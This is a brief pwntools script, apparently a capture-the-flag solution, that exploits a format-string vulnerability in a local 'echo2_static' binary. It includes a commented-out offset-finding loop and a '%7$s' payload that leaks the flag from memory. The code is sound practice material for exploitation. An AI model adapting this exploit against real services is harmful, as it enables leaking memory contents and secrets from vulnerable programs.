from pwn import *

binary = context.binary = ELF('./echo2_static')

p = process(binary.path)

# # Finding format parameter offset
# p.recvuntil('Shout something:')
# for i in range(10):
#     p.sendline("AAAAAAAA %%%d$p" % i)
#     p.recvuntil('The cave echoes back: ')
#     print("%d - %s" % (i, p.recvuntil("\n", drop = True).decode()))

# get flag
payload = b'%00007$s' + p64(binary.sym.flag)
print(payload)
p.recvuntil('Shout something:')
p.sendline(payload)
p.recvuntil('The cave echoes back: ')
flag = p.recvline()
print(flag)
p.close()